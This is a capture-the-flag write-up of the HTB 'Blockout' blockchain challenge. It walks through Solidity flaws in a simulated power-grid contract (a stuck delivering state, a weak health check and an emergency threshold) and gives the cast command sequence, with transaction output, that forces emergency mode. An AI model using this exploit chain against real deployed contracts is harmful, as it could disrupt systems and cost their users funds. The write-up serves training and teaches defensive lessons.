# HTB Business 2025 - Global Cyber Skills Benchmark

# Blockout | Blockchain | Medium

> Amazing job, Agent P. Volnaya's "VNCK" power plant was shut down due to irreparable damage to their infrastructure, leaving a mark in the history books as the "GreatBl@ck0Ut attack". However, due to their wealth and the resilience of their APT group, they were able to go back online with a new, more powerful, and secure power grid called "VCNKv2". As the final act of the Operation "Blockout" we need to take down the new kernel. I know you can do it.

## Docker Information

```IP ADDRESS & PORT
94.237.48.12:53205
94.237.48.12:47210
```
## Challenge Recon

This is a blockchain challenge, after spawning the challenge we are facing two docker instances.

The first is the RPC URL, while the second instance is the interface where we communicate with the challenge endpoint. We realize this by visiting both of the urls. How to interact with them? Let’s analyze these two URLs:

**RPC URL:** *94.237.59.38:42525*

**Challenge UI:** *nc 94.237.59.38 47210*

The first endpoint exposes a blockchain RPC node, the second is an interface to retrieve player credentials and perform challenge environment specific actions, such as get flag or restart instance.

```bash
└─$ curl http://94.237.59.38:42525/
rpc is running!
```

And the another:

```bash
└─$ nc 94.237.59.38 47210
1 - Get connection information
2 - Restart instance
3 - Get flag

Select action (enter number): 1
[*] No running node found. Launching new node...

Player Private Key : 0xaf9b6a6b6a16d5b22660b2fdc6ac0e2e497fcbda8442d842e83c27eb6d33f652
Player Address     : 0xA28BFc8F560755EAE77bddeD4e27d70C865330cb
Target contract    : 0x0e4DdF5b518e0ea01fca26dcE01f8Ef073093925
Setup contract     : 0x27B7283221678D840Fb11bE17278dA18BEE3B109
```

We queried the challenge-specific data and we are ready to fight this. We dwelve into code analysis.

## Source Code Analysis

The challenge provided the full source of the blockchain application. First things first, let’s understands the application, see what it does, how it works, then we code dig into source code analysis. We are dealing with a control unit that manages power delivery, health checks, and emergency triggers.

Diving into the source code of this challenge, we realize it is simulating a blockchain powered power grid control system. The main purpose of this application was to manage the delivery of electricity through gateways, track their health, and ensure a safe and robust grid by maintaining a healthy percentage of operation gateways. This is where we also realized the

Key functions of the blockchain application:

- `requestQuotaIncrease(uint8 amount)` → increase delivery quota by paying 4 ether.  
- `requestPowerDelivery(uint256 amount, uint8 gatewayId)` → triggers the “delivering” status.  
- `registerGateway()` → adds a new gateway, costs 20 ether.  
- `infrastructureSanityCheck()` → recalculates the healthy percentage of gateways.  

When analyzing the smart contract’s source code, the following function makes it clear it’s 4 ether.

```solidity
  function requestQuotaIncrease(uint8 _gatewayID) external payable circuitBreaker failSafeMonitor {
    Gateway storage gateway = controlUnit.registeredGateways[_gatewayID];
    require(msg.value > 0, "[VCNK] Deposit must be greater than 0.");
    require(gateway.status != GATEWAY_STATUS_UNKNOWN, "[VCNK] Gateway is not registered.");
    require(gateway.availableQuota + msg.value <= MAX_ALLOWANCE_PER_GATEWAY, "[VCNK] Requested quota exceeds maximum allowance per gateway.");
    gateway.availableQuota += msg.value;
    controlUnit.allocatedAllowance += msg.value;
    emit GatewayQuotaIncrease(_gatewayID, msg.value);
  }
```

Anything less than 4 ether does not satisfy the transaction payment condition requirement. 

Ok, makes sense, but where are those constants declared? At the beginning of the file:

```solidity
  uint256 constant MAX_CAPACITY = 100 ether;
  uint256 constant MAX_ALLOWANCE_PER_GATEWAY = 4 ether;
  uint256 constant GATEWAY_REGISTRATION_FEE = 20 ether;
  uint256 constant FAILSAFE_THRESHOLD = 10 ether;
```

Similary, we could see that 20 ether are required to register a new gateway:

```solidity
  function registerGateway() external payable circuitBreaker failSafeMonitor {
    uint8 id = controlUnit.latestRegisteredGatewayID;
    require(
      id < MAX_GATEWAYS,
      "[VCNK] Maximum number of registered gateways reached. Infrastructure will be scaled up soon, sorry for the inconvenience."
    );
    require(msg.value == GATEWAY_REGISTRATION_FEE, "[VCNK] Registration fee must be 20 ether.");
    emit GatewayDeployed(controlUnit.latestRegisteredGatewayID, msg.sender);
    _deployGateway(id);
  }
```

By reading through the function definitions and usage of “msg.value”, technically, how the app is enforcing payments: 4 ether for the request quota increase and 20 ether to register a gateway. Moreover, how it was planned to protect the grid from failures. This being the app’s main defense mechanism against a failing infrastructure. The safe operation is checked by the following function:

```solidity
function infrastructureSanityCheck() external circuitBreaker failSafeMonitor {
    uint8 healthyGateways = 0;
    for (uint8 id = 0; id < controlUnit.latestRegisteredGatewayID; id++) {
        Gateway storage gateway = controlUnit.registeredGateways[id];
        bool isGatewayHealthy = VCNKv2CompatibleReceiver(gateway.addr).healthcheck();
        if (isGatewayHealthy) {
            healthyGateways++;
        } else {
            gateway.status = GATEWAY_STATUS_DEADLOCK;
            controlUnit.allocatedAllowance -= gateway.availableQuota;
            gateway.availableQuota = 0;
            emit GatewayNeedsMaintenance(id);
        }
    }
    uint8 result = uint8((uint256(healthyGateways) * 100) / controlUnit.latestRegisteredGatewayID);
    controlUnit.healthyGatewaysPercentage = result;
}

```

Ultimately, this is when we uncovered critical vulnerabvilities in the logic. These checks are not robust enough to handle edge cases. Let’s explain each of these vulnerabilities one-by-one.

## Vulnerability #1: Stuck State Management Vulnerability

`controlUnit.status` remains stuck on *CU_STATUS_DELIVERING* and never resets this status to *IDLE*.

```solidity
function requestPowerDelivery(uint256 _amount, uint8 _gatewayID) external circuitBreaker failSafeMonitor {
    Gateway storage gateway = controlUnit.registeredGateways[_gatewayID];
    require(controlUnit.status == CU_STATUS_IDLE, "[VCNK] Control unit is not in a valid state for power delivery.");
    require(gateway.status == GATEWAY_STATUS_IDLE, "[VCNK] Gateway is not in a valid state for power delivery.");
    require(_amount > 0, "[VCNK] Requested power must be greater than 0.");
    require(_amount <= gateway.availableQuota, "[VCNK] Insufficient quota.");
    
    emit PowerDeliveryRequest(_gatewayID, _amount);
    controlUnit.status = CU_STATUS_DELIVERING;
    controlUnit.currentCapacity -= _amount;
    gateway.status = GATEWAY_STATUS_ACTIVE;
    gateway.totalUsage += _amount;

    bool status = VCNKv2CompatibleReceiver(gateway.addr).deliverEnergy(_amount);
    require(status, "[VCNK] Power delivery failed.");

    controlUnit.currentCapacity = MAX_CAPACITY;
    gateway.status = GATEWAY_STATUS_IDLE;
    emit PowerDeliverySuccess(_gatewayID, _amount);
  }

```
This locks the control unit in a stuck “delivering” state forever.

## Vulnerability #2: Inadequate Health Check Flaw

Gateways are considered “healthy” if the following condition is met:

```solidity
    function healthcheck() external view onlyProxy returns (bool) {
        return (
            _kernel() != address(0) &&
            energyVault <= MAX_VAULT_CAPACITY
        );
    }
```

This check does not validate whether the gateway is actually delivering power or stuck. Quickly, we realize that this is a weak healthcheck after all, since it ignores real operation health. It is exploitable.

Any gateway is appearing to be healthy as long the following 2 conditions are met:

- _kernel is set (it is during registration)  
- energyVault is under the cap.  

We can build on top of these our exploitation chain. This simplistic health check logic becomes the pivot point that allows us to poison the system’s healthy gateway count and mislead the entire infrastructure.

## Vulnerability #3: Emergency Trigger Mechanism Flaw

The contract triggers emergency mode if less than 50% of the gateways are healthy. Furthermore, we also know that because gateways never get cleaned up when the control unit is in stuck mode, this allows us to flood the system with failing gateways to dilute the healthy percentage and force trigger this emergency mode. This is a logic flaw in the application implementation, that ultimately can open the door for us crash the power grid.

```solidity
  modifier failSafeMonitor() {
    if (controlUnit.currentCapacity <= FAILSAFE_THRESHOLD) {
      controlUnit.status = CU_STATUS_EMERGENCY;
      emit ControlUnitEmergencyModeActivated();
    }
    else if (controlUnit.healthyGatewaysPercentage < 50) {
      controlUnit.status = CU_STATUS_EMERGENCY;
      emit ControlUnitEmergencyModeActivated();
    }
    else {
      _;
    }
  }
```

## Success Criteria: isSolved?

Let’s also see when the challenge is considered as solved, right? Our aim is to achieve this state.

```solidity
// Setup.sol
function isSolved() public view returns (bool) {
        uint8 CU_STATUS_EMERGENCY = 3;
        (uint8 status, , , , ) = TARGET.controlUnit();
        return status == CU_STATUS_EMERGENCY;
    }
```
In short, the challenge is solved when the control unit enters into emergency mode.

Once we understood the above vulnerabilities and overall functionality of the app, we can already see how all of the puzzle pieces are coming together and we can put together an exploit chain.

## Wrapping It All Up – The Exploit Plan

Analysing the source code of the blockchain application, identifying the flaws and vulnerabilities, we can put together a straightforward and concrete plan on how to crash the power grid.

1. Use `requestQuotaIncrease` to pay the quota (4 ether /piece).  
2. Trigger `requestPowerDelivery` to set `DELIVERING` state.  
3. Repeatedly register failing gateways (`registerGateway`, 20 ether /each).  
4. Run `infrastructureSanityCheck` to update the healthy percentage.  
5. Once healthy percentage < 50%, emergency mode triggers and we win!  

Check out a quick flow chart that visualizes the sequential logic steps of the exploit scenario.

![image](https://github.com/user-attachments/assets/253d7671-b369-4fec-be78-20724e9309d9)

### What this means in layman’s terms?

This challenge was about exploiting a stuck state in a smart contract-based power grid system. Normally, the system tracks healthy gateways (nodes that can deliver power). By triggering a stuck “delivering” state (using `requestPowerDelivery`), the system stopped cleaning up inactive gateways. We then registered extra failing gateways to dilute the healthy percentage.

Finally, when the healthy percentage dropped below 50%, the `infrastructureSanityCheck` confirmed the system was unhealthy, triggering emergency mode — our goal! In essence: overloading the system’s perception of “health” by adding too many failing gateways until it triggers emergency shutdown — a classic logic bomb exploiting flawed health-check logic.

This challenge demonstrates that even a small bug like forgetting to reset status can break complex state logic and cause large security issues. Also how important are robust health-checks, since the weak logic was easy to abuse and exploitable. This being a reminder how robust healt checks logic is vital in blockchain applications.

## Exploit

```bash
# Increase quota twice
cast send $TARGET "requestQuotaIncrease(uint8)" 0 --value 4ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL
cast send $TARGET "requestQuotaIncrease(uint8)" 1 --value 4ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL

# Stuck 'delivering' state
cast send $TARGET "requestPowerDelivery(uint256,uint8)" 1000000000000000000 0 --private-key $PRIVATE_KEY --rpc-url $RPC_URL

# Register 3 failing gateways
cast send $TARGET "registerGateway()" --value 20ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL
cast send $TARGET "registerGateway()" --value 20ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL
cast send $TARGET "registerGateway()" --value 20ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL

# Update health percentage
cast send $TARGET "infrastructureSanityCheck()" --private-key $PRIVATE_KEY --rpc-url $RPC_URL

# Register final gateway to push healthy % below 50%
cast send $TARGET "registerGateway()" --value 20ether --private-key $PRIVATE_KEY --rpc-url $RPC_URL
```

***Note:***  
Here we don’t need to call `infrastructureSanityCheck()` again because the system **already triggers emergency mode** automatically once the health percentage falls below 50%. Subsequent `registerGateway()` calls already recalculate the health status internally. This means that by registering the final failing gateway, we instantly force the system to enter emergency mode.

Ultimately, at this point, we can conclude that the emergency mode is triggered and the system is compromised. Once we are done, we can query the isSolved function or rush to the channel UI.

```bash
└─$ nc 94.237.48.12 47210
1 - Get connection information
2 - Restart instance
3 - Get flag
```

Type 3 to grab the flag and enjoy the success.

## Conclusion

The Blockout challenge showcases how state management bugs and superficial health-checks can be chained into a devastating exploit. We exploited the stuck **DELIVERING** state to flood the system with fake gateways, forcing an emergency shutdown — a logic bomb that brought down the power grid!

This highlights a broader lesson: in blockchain security, even tiny logic flaws can spiral into massive system failures. Always validate state transitions and ensure health-checks are meaningful!


<details>
<summary>Exploit Command Output</summary>

```bash
### 1. Increase Quota to gatewayID 0
└─$ cast send 0x0e4DdF5b518e0ea01fca26dcE01f8Ef073093925 "requestQuotaIncrease(uint8)" 0 --value 4ether --private-key <PRIVATE_KEY> --rpc-url http://94.237.59.38:42525
blockHash            0x4f4470f7b52f63761dc4afd3d935c51d53201b539b7e920f7c9746747f7a2442
blockNumber          2
cumulativeGasUsed    74873
logsBloom            0x00000000<SNIP>000002000
status               1 (success)
transactionHash      0xacc76c3172d4e87f7be7440751e674c50bd3585cb24414a67fbaf7b55b8ff63f

### 2. Increase Quota to gatewayID 1
└─$ cast send 0x0e4DdF5b518e0ea01fca26dcE01f8Ef073093925 "requestQuotaIncrease(uint8)" 1 --value 4ether --private-key <PRIVATE_KEY> --rpc-url http://94.237.59.38:42525
blockHash            0x532a38121b8da7e4cd670b6a5d157b1866d096c7fb6737e39309cc02a8a0684b
blockNumber          3
cumulativeGasUsed    57785
logsBloom            0x00000000<SNIP>000002000
status               1 (success)
transactionHash      0x11c285c113f9a6ce3acbf4d194a7da3d02ccfeb957df070c8666d305030ead61

### 3. Triggering Status Bug in PowerDelivery
└─$ cast send 0x0e4DdF5b518e0ea01fca26dcE01f8Ef073093925 "requestPowerDelivery(uint256,uint8)" 1000000000000000000 0 --private-key <PRIVATE_KEY> --rpc-url http://94.237.59.38:42525
blockHash            0x254b07d91e4127260ac0cd7d5618bcac4539ca9156d18fba072f7b68c99b1a50
blockNumber          4
cumulativeGasUsed    93960
logsBloom            0x00000100<SNIP>00000000
status               1 (success)
transactionHash      0x33eaa695b00343f5473470f3aaf4206dc71784920166cca34d15ead078b9a8bc

### 4. Register Failing Gateways
#### First Gateway
└─$ cast send 0x0e4DdF5b518e0ea01fca26dcE01f8Ef073093925 "registerGateway()" --value 20ether --private-key <PRIVATE_KEY> --rpc-url http://94.237.59.38:42525
blockHash            0x8c499caac7fb6a3fae410938d55d9943bf7b908ea152be7d1cb05371040e1847
blockNumber          5
cumulativeGasUsed    1114105
logsBloom            0x00000000<SNIP>000002000
status               1 (success)
transactionHash      0xcde6fcf5e979ce2ab27d0c74db57ec708ffe60880302b96858c16c2a9d874832

#### Second Gateway
same as the first one
#### Third Gateway
same as the first one

### 5. Update Health Percentage
└─$ cast send 0x0e4DdF5b518e0ea01fca26dcE01f8Ef073093925 "infrastructureSanityCheck()" --private-key <PRIVATE_KEY> --rpc-url http://94.237.59.38:42525
blockHash            0x1be580a2dd2bb773a3f36fb839d0b516ced9e83514f6fc1e7c24eb20762496b5
blockNumber          8
cumulativeGasUsed    124571
logsBloom            0x04000000<SNIP>00000000
status               1 (success)
transactionHash      0x7e08e32522e997e0a23e390b488fb5c84fa72b1fd902993d387c1ebafe6149a8

### 6. Final Gateway to Trigger Emergency Mode
└─$ cast send 0x0e4DdF5b518e0ea01fca26dcE01f8Ef073093925 "registerGateway()" --value 20ether --private-key <PRIVATE_KEY> --rpc-url http://94.237.59.38:42525
blockHash            0x06f0a5105e14825bc8aeec0db0d8c90d094797301db9919123708e5d353d7cdb
blockNumber          9
cumulativeGasUsed    29403
logsBloom            0x00000000<SNIP>000002000
status               1 (success)
transactionHash      0xbea0f0d473762651b14a0484dae9e6724f2013a3df913d18c340a43799a8f635

### Step 7: Verify Solution
└─$ cast call 0x27B7283221678D840Fb11bE17278dA18BEE3B109 "isSolved()" --rpc-url http://94.237.59.38:42525
Result:
0x0000000000000000000000000000000000000000000000000000000000000001
```
</details>

Hope you find it useful,

Over and out,

`--RW`
